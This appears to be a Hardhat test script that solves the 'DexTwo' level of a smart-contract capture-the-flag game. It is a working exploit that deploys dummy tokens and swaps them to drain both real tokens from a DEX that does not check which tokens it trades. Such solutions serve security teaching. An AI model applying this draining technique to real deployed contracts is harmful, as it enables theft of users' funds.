const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("DexTwo");
  const challengeAddress = await createChallenge(`0xf59112032D54862E199626F55cFad4F8a3b0Fce9`)
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 23-DexTwo", async function () {
  const challenge = await getChallenge();
  const challengeAddress = await challenge.getAddress();

  // Build two dummy tokens to swap for the 2 tokens we really want.
  const factory = await ethers.getContractFactory("DexTwoAttackerToken");
  const attackerToken1 = await factory.deploy("name", "symbol", 1000000000);
  await attackerToken1.waitForDeployment();
  const attackerToken1Address = await attackerToken1.getAddress();
  const attackerToken2 = await factory.deploy("name2", "symbol2", 1000000000);
  await attackerToken2.waitForDeployment();
  const attackerToken2Address = await attackerToken2.getAddress();

  const token1Address = await challenge.token1();
  const token2Address = await challenge.token2();

  // Approve dex to spend all our tokens.
  await challenge.approve(challengeAddress, 1000000);
  await attackerToken1.approve(challengeAddress, 1000000);
  await attackerToken2.approve(challengeAddress, 1000000);

  // Drain token1
  await attackerToken1.transfer(challengeAddress, 100);
  await challenge.swap(attackerToken1Address, token1Address, 100);

  // Drain token2
  await attackerToken2.transfer(challengeAddress, 100);
  await challenge.swap(attackerToken2Address, token2Address, 100);

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
